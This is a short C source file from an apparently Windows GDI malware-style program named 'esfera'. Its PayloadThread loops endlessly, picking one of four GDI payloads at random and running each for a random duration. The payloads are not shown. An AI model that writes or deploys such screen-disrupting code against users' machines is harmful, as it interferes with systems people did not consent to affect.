#include "esfera.h"

VOID
WINAPI
PayloadThread(
	VOID
)
{
	PPAYLOADS* pGdiPayloads[ ] = { GdiPayload1, GdiPayload2, GdiPayload3, GdiPayload4 };
	INT nPayloads = sizeof( pGdiPayloads ) / sizeof( pGdiPayloads[ 0 ] );
	for ( ;; )
	{
		ExecutePayload( pGdiPayloads[ Xorshift32( ) % nPayloads ], Xorshift32( ) % 5000 );
	}
}